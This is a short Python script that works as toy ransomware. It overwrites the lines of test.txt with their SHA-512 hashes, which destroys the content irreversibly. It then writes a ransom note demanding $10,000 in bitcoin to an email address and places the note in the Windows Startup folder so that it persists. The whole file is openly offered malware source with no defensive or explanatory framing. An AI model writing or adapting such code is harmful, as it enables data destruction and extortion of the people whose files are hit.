import shutil
import hashlib
import os

# Find the main disk letter
def mainDiskLetter():
	return os.path.splitdrive(os.getcwd())[0]

mainDisk = mainDiskLetter()


f = open("test.txt", "r")
f2 = open("test2.txt", "w")
f3 = open("readme.txt", "w")
f3.write("Your file has been taken ransom! Make a payment of $10,000 in bitcoin to ransom143@protonmail.com in order to regain access to your file.\n\n")
for line in f:
	if line != "\n" and line != "":
		f2.write(hashlib.sha512(line.encode()).hexdigest() + "\n")
f.close()
f2.close()
f3.close()
shutil.move("test2.txt", "test.txt")

# Move readme.txt to the Starup folder
shutil.move("readme.txt", mainDisk + "\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")

